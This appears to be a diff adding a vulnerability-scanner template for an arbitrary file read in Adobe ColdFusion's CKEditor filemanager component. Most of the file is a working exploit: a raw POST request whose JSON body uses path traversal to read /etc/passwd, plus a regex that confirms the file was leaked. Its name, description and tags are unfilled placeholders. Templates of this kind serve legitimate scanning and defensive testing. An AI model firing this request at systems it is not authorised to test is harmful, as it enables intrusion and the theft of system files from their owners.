@@ -1,0 +1,28 @@
+id: Adobe-ColdFusion-filemanager-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: lfi
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/A2-2AdobeColdFusion-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96?id=a2-2adobecoldfusion-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=foo&_cfclient=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Length: 90
+
+        _variables={"_metadata":{"classname":"../../../../../../../../../../../../../etc/passwd"}}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
